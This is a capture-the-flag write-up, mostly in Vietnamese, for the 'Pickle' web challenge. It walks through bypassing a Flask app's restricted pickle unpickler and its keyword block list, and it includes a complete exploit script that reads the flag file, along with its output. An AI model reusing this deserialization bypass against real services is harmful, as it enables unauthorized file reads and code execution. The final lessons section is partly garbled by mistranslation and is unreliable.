---
title: "PwnSec CTF Write-up: Pickle"
date: 2026-09-12 
categories: [Write-ups, PwnSec CTF]
tags: [web, PwnSec]
---

# PwnSec CTF 2026 — Pickle (Web, Easy, 226 pts)

> **Author:** P0uZ_Gh0sT  
> **Category:** Web  
> **Difficulty:** Easy  
> **Flag:** `pwnsec{6a12c7c6e9f7c96e}`

<img width="1542" height="742" alt="Screenshot 2026-09-12 231800" src="https://github.com/user-attachments/assets/40f49f35-93e0-44b5-a09f-031bb8a35d5c" />

<img width="1425" height="85" alt="Screenshot 2026-09-12 232119" src="https://github.com/user-attachments/assets/db08f9d9-2e2e-4858-9e71-7085b5135fed" />


## Challenge Overview

Chúng ta được cung cấp một ứng dụng web Flask có tên là **"Time Capsule"**; ứng dụng này nhận một payload Python pickle đã được mã hóa base64, kiểm tra tính hợp lệ qua nhiều lớp bảo mật, và sau đó giải tuần tự hóa (deserialize) nó bằng một cơ chế unpickler bị hạn chế quyền hạn.

Mục tiêu là đọc flag tại `/app/flag.txt`.

```
POST /restore
Content-Type: application/json

{"payload": "<base64-encoded pickle>"}
```

<img width="1916" height="802" alt="Screenshot 2026-09-12 232624" src="https://github.com/user-attachments/assets/4ce0cbaa-7335-4f13-b4f7-940a9757eb94" />

<img width="1917" height="793" alt="Screenshot 2026-09-12 232629" src="https://github.com/user-attachments/assets/455cde98-4fb3-47aa-ac8b-da43a7777015" />

---

## Source Code Analysis

### webapp.py — Main Application

```python
import base64, os, io, pickle, pickletools
from flask import Flask, jsonify, render_template, request
import sessionstore  # noqa: F401

BANNED_PATTERNS = [
    b".", b"os", b"system", b"popen", b"subprocess", b"commands",
    b"exec", b"eval", b"import", b"getattr", b"setattr", b"flag"
]
BANNED_INSTRUCTION = "REDUCE"
ALLOWED_MODULES = {"sessionstore", "collections"}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module.split(".")[0] not in ALLOWED_MODULES:
            raise pickle.UnpicklingError("module %r is not allowed" % module)
        return super().find_class(module, name)

def check(data):
    for pattern in BANNED_PATTERNS:
        if pattern in data:
            raise ValueError("Payload contains banned characters!")
    out = io.StringIO()
    try:
        pickletools.dis(data, out=out)
        disassembled = out.getvalue()
        if BANNED_INSTRUCTION in disassembled:
            raise ValueError("Payload contains banned instruction: %s" % BANNED_INSTRUCTION)
    except Exception:
        disassembled = "Error!"
    return disassembled

def restore(raw_b64):
    import contextlib
    data = base64.b64decode(raw_b64)
    disassembled = check(data)
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        try:
            RestrictedUnpickler(io.BytesIO(data)).load()
        except Exception:
            pass
    return buf.getvalue(), disassembled
```

### sessionstore.py — Whitelisted Module

```python
class Capsule:
    def __init__(self, owner="guest"):
        self.owner = owner
        self.cache = {}

    def __repr__(self):
        return "<Capsule owner=%r fields=%s>" % (self.owner, list(self.cache))

def render(record, key):
    return record.cache[key]

def new_capsule(owner="guest"):
    return Capsule(owner)
```

### Security Layers

Ứng dụng triển khai **3 lớp** phòng thủ:

| # | Layer | Mechanism |
|---|-------|-----------|
| 1 | `BANNED_PATTERNS` | Kiểm tra chuỗi con byte thô — chặn `b"."`, `b"os"`, `b"flag"`, v.v. |
| 2 | `BANNED_INSTRUCTION` | Kiểm tra mã phân rã — chặn mã lệnh `REDUCE` trong đầu ra của `pickletools.dis()` |
| 3 | `RestrictedUnpickler` | Danh sách cho phép mô-đun — chỉ cho phép `sessionstore` và `collections` |

---

## Vulnerability Analysis

### Layer 1: BANNED_PATTERNS — The Impossible Filter?

Điểm đáng chú ý đầu tiên là `b"."` trong danh sách các mẫu bị cấm. Trong pickle, **mọi luồng pickle hợp lệ đều phải kết thúc bằng mã lệnh STOP**, chính là `b"."` (`0x2e`).
```
STOP = b"."  # opcode 0x2e — terminates pickle deserialization
```

Điều này có nghĩa là không một đối tượng pickle hợp lệ nào có thể vượt qua hàm `check()`... hay là có thể?
Xét phần xử lý lỗi trong `restore()`:
```python
with contextlib.redirect_stdout(buf):
    try:
        RestrictedUnpickler(io.BytesIO(data)).load()
    except Exception:
        pass  # <— Exception is silently swallowed!
```

**Nếu bỏ qua mã lệnh STOP**, máy ảo pickle sẽ xử lý tất cả các mã lệnh của chúng ta, thực thi các tác dụng phụ của chúng, rồi gặp lỗi `EOFError` khi cố gắng đọc mã lệnh tiếp theo. Ngoại lệ này bị bắt và bỏ qua — nhưng **mọi lệnh `print()` đều đã ghi dữ liệu vào stdout**, và dữ liệu này đã được `redirect_stdout` ghi lại.

### Layer 2: REDUCE Disassembly Check

Mã lệnh `REDUCE` (`R`, `0x52`) là cách tiêu chuẩn để gọi các hàm trong pickle. Nó được kiểm tra thông qua:

```python
try:
    pickletools.dis(data, out=out)
    disassembled = out.getvalue()
    if BANNED_INSTRUCTION in disassembled:  # "REDUCE"
        raise ValueError(...)
except Exception:
    disassembled = "Error!"   # <— Falls through here!
```

Nếu thiếu mã lệnh STOP, `pickletools.dis()` sẽ **phát sinh ngoại lệ** khi gặp điểm kết thúc dữ liệu (EOF). Nhánh `except` sẽ bắt lấy ngoại lệ này và gán `disassembled = "Error!"` — qua đó **bỏ qua hoàn toàn bước kiểm tra REDUCE**.

### Layer 3: RestrictedUnpickler

```python
ALLOWED_MODULES = {"sessionstore", "collections"}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module.split(".")[0] not in ALLOWED_MODULES:
            raise pickle.UnpicklingError(...)
        return super().find_class(module, name)
```

Chỉ các mô-đun `sessionstore` và `collections` mới được phép sử dụng. Chúng ta không thể trực tiếp import `builtins`, `os` hay bất kỳ mô-đun nào khác.

Tuy nhiên, `find_class(module, name)` thực hiện gọi `getattr(sys.modules[module], name)` ở bên trong. Điều này có nghĩa là chúng ta có thể truy cập **bất kỳ thuộc tính nào** của các module được cho phép, bao gồm cả `__builtins__`!

---

## Exploitation Strategy

### Key Insight: Loại bỏ mã lệnh STOP

Bằng cách tạo ra một luồng pickle **không chứa mã lệnh STOP** (`0x2e`), chúng ta đồng thời vượt qua được:

1. `b"."` trong `BANNED_PATTERNS` — byte `0x2e` đơn giản là không tồn tại trong payload của chúng ta
2. `REDUCE` disassembly check — `pickletools.dis()` crashes, Việc kiểm tra bị bỏ qua.
3. Side effects vẫn được thực thi — `print()` output được capture lại trước khi crash.

```
Normal pickle:   [opcodes...] + STOP(0x2e)  →  clean exit
Our pickle:      [opcodes...]               →  EOFError (caught by except:pass)
```

### Truy cập các hàm tích hợp sẵn

Trong Python 3, mọi module không phải là `__main__` đều có thuộc tính `__builtins__` được thiết lập là `builtins.__dict__`. Vì `sessionstore` được import bởi `webapp.py`, nên ta có thể truy cập nó:

```
GLOBAL "sessionstore" "__builtins__"
→ getattr(sessionstore, "__builtins__")
→ builtins.__dict__   (a dict containing open, print, list, bytes, ...)
```

Trường hợp này vượt qua được `RestrictedUnpickler` vì `"sessionstore"` nằm trong `ALLOWED_MODULES`.

### The Capsule + Render Trick

Giờ chúng ta đã có dictionary `builtins`, nhưng làm thế nào để trích xuất các hàm từ nó? Chúng ta không thể sử dụng trực tiếp `dict["key"]` trong `pickle`.
Hãy xem hàm `render()` từ `sessionstore`:

```python
def render(record, key):
    return record.cache[key]   # <— dict lookup!
```

Nếu chúng ta tạo một đối tượng `Capsule` và **ghi đè thuộc tính `cache` của nó** bằng từ điển tích hợp (built-in dict) thông qua mã lệnh `BUILD`, thì:

```python
render(capsule, "open")
= capsule.cache["open"]
= builtins.__dict__["open"]
= <built-in function open>    # 
```

Mã lệnh `BUILD` gọi `obj.__dict__.update(state)`, cho phép chúng ta thiết lập `capsule.cache = builtins_dict`:

```
GLOBAL "sessionstore" "Capsule"  →  Capsule class
EMPTY_TUPLE + REDUCE             →  Capsule() instance
EMPTY_DICT                       →  {}
  SHORT_BINUNICODE "cache"       →  "cache"
  BINGET 0                       →  builtins_dict (from memo)
  SETITEM                        →  {"cache": builtins_dict}
BUILD                            →  capsule.cache = builtins_dict
```

### Building the Filename

Chúng ta cần mở `flag.txt`, nhưng cả `b"flag"` và `b"."` đều bị cấm dưới dạng chuỗi con byte thô.

**Solution:** Tạo tên tệp tại thời điểm thực thi bằng cách sử dụng `bytes([int, int, ...])`:

```python
bytes([102, 108, 97, 103, 46, 116, 120, 116])
#       f    l    a    g    .    t    x    t
# = b"flag.txt"
```

Trong bytecode của pickle, mỗi số nguyên được mã hóa kèm theo tiền tố opcode riêng (ví dụ: `K` cho `BININT1`), do đó chuỗi `"flag"` không bao giờ xuất hiện dưới dạng các byte liền kề nhau:

```
K\x66  K\x6c  K\x61  K\x67  ...
 ^^^^   ^^^^   ^^^^   ^^^^
 Each int separated by 0x4b prefix → "flag" pattern broken!
```

Đối với ký tự `.` (có giá trị byte là 46), chúng ta không thể sử dụng `BININT1` vì `K\x2e` chứa `0x2e`. Thay vào đó, ta sử dụng mã lệnh `INT`, mã hóa số đó dưới dạng văn bản ASCII:

```
INT opcode: I46\n  →  bytes: 0x49 0x34 0x36 0x0a  →  no 0x2e! 
```

### Final Chain

```
print(list(open(b"flag.txt")))
```

Sử dụng các lệnh gọi `REDUCE` được nối chuỗi:

```
Stack:   print → list → open → path
         ─────   ────   ────   ────
Step 1:  TUPLE1 + REDUCE  →  file = open(path)
Step 2:  TUPLE1 + REDUCE  →  lines = list(file)
Step 3:  TUPLE1 + REDUCE  →  print(lines)  →  stdout captured!
```

---

## Exploit Code

```python
#!/usr/bin/env python3
"""Exploit for PwnSec CTF 2026 — pickle challenge"""

import base64, sys, json

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


def craft_payload():
    p = b""
    p += b"\x80\x02"                              # PROTO 2

    # Phase 1: Get builtins dict
    p += b"csessionstore\n__builtins__\n"          # GLOBAL
    p += b"q\x00"                                  # BINPUT 0 (memo)
    p += b"0"                                      # POP

    # Phase 2: Capsule with cache = builtins_dict
    p += b"csessionstore\nCapsule\n"               # GLOBAL
    p += b")"                                      # EMPTY_TUPLE
    p += b"R"                                      # REDUCE → Capsule()
    p += b"}"                                      # EMPTY_DICT
    p += b"\x8c\x05cache"                          # SHORT_BINUNICODE "cache"
    p += b"h\x00"                                  # BINGET 0
    p += b"s"                                      # SETITEM
    p += b"b"                                      # BUILD
    p += b"q\x01"                                  # BINPUT 1
    p += b"0"                                      # POP

    # Phase 3: Get render function
    p += b"csessionstore\nrender\n"                # GLOBAL
    p += b"q\x02"                                  # BINPUT 2
    p += b"0"                                      # POP

    # Phase 4: Extract builtins via render(capsule, key)
    for idx, name in [(3, "bytes"), (4, "open"), (5, "list"), (6, "print")]:
        p += b"h\x02h\x01"                         # render, capsule
        p += bytes([0x8c, len(name)]) + name.encode()
        p += b"\x86R"                              # TUPLE2 + REDUCE
        p += bytes([0x71, idx])                    # BINPUT idx
        p += b"0"                                  # POP

    # Phase 5: Build b"flag.txt" via bytes([...])
    p += b"h\x03"                                  # bytes constructor
    p += b"]("                                     # EMPTY_LIST + MARK
    for c in b"flag.txt":
        if c == 0x2e:                              # '.' → use INT opcode
            p += b"I46\n"
        else:
            p += bytes([0x4b, c])                  # BININT1
    p += b"e"                                      # APPENDS
    p += b"\x85R"                                  # TUPLE1 + REDUCE
    p += b"q\x07"                                  # BINPUT 7
    p += b"0"                                      # POP

    # Phase 6: print(list(open(path)))
    p += b"h\x06h\x05h\x04h\x07"                  # print, list, open, path
    p += b"\x85R" * 3                              # 3x (TUPLE1 + REDUCE)

    # NO STOP opcode — intentional!
    return p


def main():
    payload = craft_payload()
    b64 = base64.b64encode(payload).decode()

    # Verify no banned patterns
    BANNED = [b".", b"os", b"system", b"popen", b"subprocess",
              b"commands", b"exec", b"eval", b"import",
              b"getattr", b"setattr", b"flag"]
    for pat in BANNED:
        assert pat not in payload, f"Banned pattern {pat!r} found!"
    print("[+] Payload clean — all checks passed")
    print(f"[+] Base64: {b64}\n")

    if len(sys.argv) > 1:
        url = sys.argv[1].rstrip("/")
        r = requests.post(f"{url}/restore", json={"payload": b64}, timeout=15)
        d = r.json()
        print(json.dumps(d, indent=2))
        if d.get("ok"):
            print(f"\nFLAG: {d['output'].strip()}")
    else:
        print(f"Usage: python3 exploit.py http://<target>:9999")


if __name__ == "__main__":
    main()
```

---

## Result

```
$ python3 exploit.py https://7e08a50baea8f705.chal.ctf.ae

[+] Payload clean — all checks passed
[+] Base64: gAJjc2Vzc2lvbnN0b3JlCl9fYnVpbH...

{
  "disassembled": "Error!",
  "ok": true,
  "output": "['pwnsec{6a12c7c6e9f7c96e}\\n']\n"
}

 FLAG: ['pwnsec{6a12c7c6e9f7c96e}\n']
```

**`pwnsec{6a12c7c6e9f7c96e}`** 

<img width="1917" height="767" alt="Screenshot 2026-09-12 221500" src="https://github.com/user-attachments/assets/626ff8cb-a451-4387-bd9c-2d1a9dc83fc2" />

---

## Bài học rút ra 

1. **Mã opcode STOP của Pickle chỉ là một byte** — nếu bộ lọc của bạn cấm `b"."` (`0x2e`), bạn đã vô tình cấm opcode STOP. Nhưng việc loại bỏ STOP không ngăn được tác dụng phụ khi thực thi.

2. **`ngoại trừ: pass` là nguy hiểm** — âm thầm nuốt các ngoại lệ sau `pickle.load()` có nghĩa là bất kỳ tác dụng phụ nào (đọc tệp, in, gọi mạng) vẫn tồn tại ngay cả khi quá trình khử lưu huỳnh "thất bại".

3. **`__buildins__` có ở khắp mọi nơi** — mọi mô-đun Python đều có `__buildins__` làm thuộc tính. Việc đưa một mô-đun vào danh sách trắng trong trình giải nén bị hạn chế không chỉ hiển thị API công khai của nó — nó còn hiển thị `buildins.__dict__`.

4. **Bộ lọc cấp byte rất dễ hỏng** — việc kiểm tra `b"cờ" trong dữ liệu` có thể bị bỏ qua bằng cách xây dựng chuỗi trong thời gian chạy bằng cách sử dụng các giá trị byte nguyên, nối hoặc thủ thuật mã hóa.

---

*Writeup by thu4n_ph4t — PwnSec CTF 2026*
